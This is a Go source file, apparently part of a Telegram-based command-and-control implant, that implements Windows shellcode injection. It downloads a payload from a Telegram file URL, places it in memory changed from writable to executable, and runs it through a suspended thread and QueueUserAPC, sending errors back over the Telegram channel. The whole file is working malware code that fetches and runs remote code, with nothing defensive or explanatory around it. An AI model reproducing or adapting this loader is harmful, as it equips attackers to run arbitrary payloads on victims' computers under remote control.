//go:build windows

package functions

import (
	"fmt"
	"io"
	"syscall"
	"unsafe"

	"TG_c2_go/telegram"
)

// Injector 代码注入功能
type Injector struct {
	client *telegram.TelegramClient
}

// NewInjector 创建新的注入器
func NewInjector() *Injector {
	return &Injector{
		client: telegram.NewTelegramClient(),
	}
}

// InjectShellcode 注入shellcode (仅Windows)
func (inj *Injector) InjectShellcode(fileID string, tgClient *telegram.TelegramClient) error {
	fmt.Printf("[调试] 开始下载shellcode，文件ID: %s\\n", fileID)

	// 获取文件下载URL
	downloadURL, _, err := tgClient.GetFileDownloadURL(fileID)
	if err != nil {
		return fmt.Errorf("获取下载URL失败: %v", err)
	}

	fmt.Printf("[调试] 下载URL: %s\\n", downloadURL)

	// 下载shellcode
	shellcode, err := inj.downloadShellcode(downloadURL, tgClient)
	if err != nil {
		return fmt.Errorf("下载shellcode失败: %v", err)
	}

	fmt.Printf("[调试] Shellcode大小: %d 字节\\n", len(shellcode))

	// 在新的goroutine中执行注入
	go func() {
		defer func() {
			if r := recover(); r != nil {
				msg := fmt.Sprintf("注入过程发生panic: %v", r)
				inj.client.SendMessage(msg)
			}
		}()

		if err := inj.performInjection(shellcode); err != nil {
			inj.client.SendMessage(fmt.Sprintf("注入失败: %v", err))
		} else {
			fmt.Println("[调试] 注入完成")
		}
	}()

	return nil
}

// downloadShellcode 下载shellcode
func (inj *Injector) downloadShellcode(url string, tgClient *telegram.TelegramClient) ([]byte, error) {
	// 创建HTTP客户端直接下载
	resp, err := tgClient.GetHTTPClient().Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return io.ReadAll(resp.Body)
}

// performInjection 执行APC注入 (Windows)
func (inj *Injector) performInjection(shellcode []byte) error {
	// Windows API函数
	kernel32 := syscall.NewLazyDLL("kernel32.dll")

	createThread := kernel32.NewProc("CreateThread")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	virtualProtect := kernel32.NewProc("VirtualProtect")
	queueUserAPC := kernel32.NewProc("QueueUserAPC")
	resumeThread := kernel32.NewProc("ResumeThread")
	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	sleepEx := kernel32.NewProc("SleepEx")

	// 创建可等待的线程函数
	threadFunc := syscall.NewCallback(func() uintptr {
		sleepEx.Call(0xFFFFFFFF, 1)
		return 0
	})

	// 创建线程
	threadHandle, _, err := createThread.Call(
		0,          // lpThreadAttributes
		0,          // dwStackSize
		threadFunc, // lpStartAddress
		0,          // lpParameter
		0x4,        // dwCreationFlags (CREATE_SUSPENDED)
		0,          // lpThreadId
	)

	if threadHandle == 0 {
		return fmt.Errorf("创建线程失败: %v", err)
	}

	fmt.Printf("[调试] 线程句柄: %x\\n", threadHandle)

	// 分配内存
	const (
		MEM_COMMIT        = 0x1000
		MEM_RESERVE       = 0x2000
		PAGE_READWRITE    = 0x04
		PAGE_EXECUTE_READ = 0x20
	)

	addr, _, err := virtualAlloc.Call(
		0,                       // lpAddress
		uintptr(len(shellcode)), // dwSize
		MEM_COMMIT|MEM_RESERVE,  // flAllocationType
		PAGE_READWRITE,          // flProtect
	)

	if addr == 0 {
		return fmt.Errorf("内存分配失败: %v", err)
	}

	fmt.Printf("[调试] 分配的内存地址: %x\\n", addr)

	// 复制shellcode到分配的内存
	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode)], shellcode)

	// 修改内存保护属性为可执行
	var oldProtect uint32
	ret, _, err := virtualProtect.Call(
		addr,                                 // lpAddress
		uintptr(len(shellcode)),              // dwSize
		PAGE_EXECUTE_READ,                    // flNewProtect
		uintptr(unsafe.Pointer(&oldProtect)), // lpflOldProtect
	)

	if ret == 0 {
		return fmt.Errorf("修改内存保护失败: %v", err)
	}

	// 将shellcode地址排队到APC
	ret, _, err = queueUserAPC.Call(
		addr,         // pfnAPC
		threadHandle, // hThread
		0,            // dwData
	)

	if ret == 0 {
		return fmt.Errorf("QueueUserAPC失败: %v", err)
	}

	// 恢复线程执行
	resumeThread.Call(threadHandle)

	// 等待线程完成 (可选)
	waitForSingleObject.Call(threadHandle, 0xFFFFFFFF)

	return nil
}
